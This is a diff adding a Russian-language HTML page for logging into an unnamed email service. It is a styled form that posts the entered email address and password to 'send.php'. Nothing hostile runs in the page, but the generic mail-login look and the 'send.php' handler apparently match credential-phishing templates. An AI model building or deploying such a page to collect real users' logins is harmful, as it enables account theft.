@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Вход в почту</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-family: Arial, sans-serif;
+      background-color: #f0f0f0;
+    }
+    .login-form {
+      background-color: white;
+      padding: 30px;
+      border-radius: 5px;
+      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+    }
+    .login-form h2 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .login-form label {
+      display: block;
+      margin-bottom: 5px;
+    }
+    .login-form input[type="text"],
+    .login-form input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 3px;
+    }
+    .login-form input[type="submit"] {
+      display: block;
+      width: 100%;
+      padding: 10px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 3px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <form class="login-form" action="send.php" method="post">
+    <h2>Вход в электронную почту</h2>
+    <label for="email">Электронная почта</label>
+    <input type="text" id="email" name="email" required>
+    <label for="password">Пароль</label>
+    <input type="password" id="password" name="password" required>
+    <input type="submit" value="Войти">
+
+  </form>
+</body>
+</html>
